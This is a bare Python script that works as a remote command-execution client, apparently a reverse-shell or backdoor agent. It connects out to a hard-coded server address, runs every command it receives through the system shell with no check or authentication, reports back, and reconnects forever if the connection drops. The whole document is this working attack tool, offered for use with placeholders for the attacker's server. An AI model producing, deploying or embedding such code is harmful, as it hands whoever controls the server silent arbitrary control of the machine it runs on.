import socket
import subprocess

def start_client(server_ip, server_port):
    while True:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((server_ip, server_port))
                while True:
                    command = s.recv(1024).decode('utf-8')
                    if command:
                        print(f"Received command: {command}")
                        try:
                            subprocess.run(command, shell=True)
                            s.sendall(b"Process started successfully")
                        except Exception as e:
                            s.sendall(f"Error: {str(e)}".encode('utf-8'))
        except Exception as e:
            print(f"Connection failed: {e}. Retrying...")
            continue

if __name__ == "__main__":
    server_ip = "192.168.1.65"  # Replace with your server's IP address
    server_port = 9999          # Replace with your server's port
    start_client(server_ip, server_port)
